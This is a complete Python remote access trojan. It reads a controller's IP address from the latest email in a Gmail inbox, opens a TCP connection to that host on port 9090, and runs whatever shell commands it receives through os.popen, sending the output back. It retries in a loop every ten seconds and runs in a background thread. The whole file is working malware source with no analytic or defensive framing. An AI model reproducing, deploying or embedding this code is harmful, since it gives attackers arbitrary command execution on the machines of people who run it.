import email
import imaplib
import os
import socket
import threading
import time


def trojan():
    while True:
        try:
            HOST = str(getIP()).strip()
            PORT = 9090
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((HOST, PORT))
            while True:
                command = client.recv(2048).decode("utf-8")
                if len(command.strip()) > 1:
                    output = os.popen(command).read()
                    if len(output) > 0:
                        client.send(output.encode("utf-8"))
                    else:
                        client.send("done".encode("utf-8"))
                else:
                    client.send("please enter valid command".encode("utf-8"))

        except:
            time.sleep(10)


def getIP():
    mail = imaplib.IMAP4_SSL('imap.gmail.com')
    mail.login('username', 'password')
    mail.list()
    mail.select('inbox')
    result, data = mail.uid('search', None, "ALL")
    i = len(data[0].split())
    for x in range(i):
        latest_email_uid = data[0].split()[x]
        result, email_data = mail.uid('fetch', latest_email_uid, '(RFC822)')

        raw_email = email_data[0][1]

    raw_email_string = raw_email.decode('utf-8')

    email_message = email.message_from_string(raw_email_string)
    for part in email_message.walk():
        if part.get_content_type() == "text/plain":
            body = part.get_payload(decode=True)
            return body.decode("utf-8")


t1 = threading.Thread(target=trojan)
t1.start()
